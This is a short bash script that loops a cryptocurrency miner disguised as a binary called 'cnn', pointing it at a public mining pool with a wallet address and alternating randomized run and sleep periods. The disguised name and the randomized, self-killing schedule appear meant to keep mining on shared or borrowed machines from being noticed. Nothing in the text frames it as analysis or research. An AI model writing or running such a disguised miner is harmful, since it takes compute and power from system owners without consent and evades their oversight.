while :
do

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%120))
	b=600
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=120
	aaram=$(($w+$e))
	timeout -k 5 $c\s   ./cnn/cnn -P stratum+tcp://RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.worker@us.cruxpool.com:9999 -U
	timeout -k 5 2s pgrep cnn | xargs kill
	sleep $aaram
	echo "Kartik Bhai Amar Rahe"
done
